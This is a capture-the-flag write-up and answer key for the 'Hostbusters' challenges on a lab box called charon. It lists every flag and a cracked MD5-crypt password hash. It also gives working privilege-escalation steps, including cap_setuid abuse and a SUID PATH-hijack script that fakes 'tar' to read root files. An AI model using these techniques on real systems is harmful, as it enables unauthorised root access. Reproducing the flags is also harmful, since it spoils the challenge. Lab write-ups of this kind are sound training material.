# DEADFACE 2026 — Hostbusters flags

Recovered from the live `charon` web-shell box on 2026-10-18. The seven member challenges map to
the target user's home-directory flag; the final root/`d34th` flag (`Heavy is the Crown`) is in
`/root/flag.txt`.

| ID | Challenge | Points | Target user | Flag |
|---:|---|---:|---|---|
| 12 | Foothold on Charon | 10 | `svc-deploy` | `deadface{f00th0ld_p4st_th3_v31l}` |
| 13 | Looking Back | 30 | `deephax` | `deadface{sh3ll_h1st0ry_t3lls_4ll}` |
| 14 | Git Good | 100 | `gh0st404` | `deadface{g1t_l0g_sp1lls_s3cr3ts}` |
| 15 | On Schedule | 200 | `sunstalker` | `deadface{cr0n_c4rr13d_my_p4yl04d}` |
| 16 | Lilith | 250 | `lilith` | `deadface{sud0_f1nd_4_w4y_1n}` |
| 17 | Dangerous Capability | 300 | `spookyboi` | `deadface{c4p_s3tu1d_cuts_d33p}` |
| 68 | Old Habits | 350 | `mort1cia` | `deadface{0s1nt_n3v3r_f0rg3ts}` |
| — | Heavy is the Crown (new) | — | `root` / `d34th` | `deadface{p4th_h1j4ck3d_t0_thr0n3}` |

## Intended chain notes (verified box clues; exploit steps not all run)

- `svc-deploy` → `deephax`: `.bash_history` contains the onboarding password reset.
- `deephax` → `gh0st404`: deephax's `notes.txt` admits committing the scraper service password
  and only "removing" it in the next commit (the Git Good challenge).
- `gh0st404` → `sunstalker`: `/opt/scrape/collect.sh` is owned by `gh0st404` and its comment says
  it is "RUN BY sunstalker via cron"; editing it should execute the payload as `sunstalker`.
- `sunstalker` → `lilith`: verified `sunstalker ALL=(lilith) NOPASSWD: /usr/bin/find`; use
  `sudo -u lilith find ... -exec ... \;`.
- `lilith` → `spookyboi`: `/opt/crypto/cryptctl` has `cap_setuid=ep`; `lilith/osint.txt` points
  at spookyboi as the holder of the decryption tooling.
- `spookyboi` → `mort1cia`: verified. `creds.bak` had mort1cia's MD5-crypt hash and the
  GhostTown posting-history hint; the reused personal password is `princess2015` (see Old Habits
  verification below).

## Old Habits verification

`spookyboi`'s hidden cache contained mort1cia's MD5-crypt hash and a note to read her GhostTown
posting history:

```text
mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20
```

The public GhostTown thread
`/t/50/yo-mort1cia-we-need-to-talk-about-ur-past` reveals that `gh0st404` set the password to
something easy to remember based on an old Halloween photo of mort1cia dressed as a Disney
princess (pink dress, tiara, magic wand). The targeted candidate script
`deadface-2026/old-habits/crack_mort1cia.py` recovers:

```text
FOUND: princess2015
```

Confirmed on the box:

```text
charon:~$ su - mort1cia
Password: princess2015
charon:~$ id
uid=1007(mort1cia) gid=1007(mort1cia) groups=1007(mort1cia),1007(mort1cia)
charon:~$ cat ~/flag.txt
deadface{0s1nt_n3v3r_f0rg3ts}
```


## Dangerous Capability verification

`/opt/crypto/cryptctl` carries `cap_setuid=ep` and switches to `spookyboi`:

```bash
$ getcap /opt/crypto/cryptctl
/opt/crypto/cryptctl cap_setuid=ep

$ printf 'id; cat /home/spookyboi/flag.txt; exit\n' | /opt/crypto/cryptctl
[cryptctl] assuming the crypto service identity.
uid=1006(spookyboi) gid=1001(svc-deploy) groups=1001(svc-deploy),1001(svc-deploy)
deadface{c4p_s3tu1d_cuts_d33p}
```

## Heavy is the Crown verification

The new live challenge's flag is the root flag, next to `d34th`'s Kingmaker note:

```text
/root/flag.txt:deadface{p4th_h1j4ck3d_t0_thr0n3}
/root/kingmaker.txt:
== KINGMAKER MASTER PAYLOAD ==
... Release schedule and kompromat index held here by d34th.
```

The flag text matches the SUID `charon-backup` path-hijack solve: hijack `tar`, take the root
throne, read `/root/flag.txt`.

## charon-backup root shortcut (Lilith / Heavy is the Crown)

`/usr/local/bin/charon-backup` is SUID root and runs `tar` through `PATH` without dropping
privileges. A fake `tar` in a writable directory gives a root context, which can read the root flag
and every `/home/*/flag.txt` directly:

```bash
mkdir -p /tmp/x
cat > /tmp/x/tar <<'EOF'
#!/bin/sh
{
  cat /root/flag.txt
  for f in /home/*/flag.txt; do echo "== $f"; cat "$f"; done
} > /tmp/allflags.txt
chmod 644 /tmp/allflags.txt
EOF
chmod +x /tmp/x/tar
PATH=/tmp/x:$PATH /usr/local/bin/charon-backup
cat /tmp/allflags.txt
```
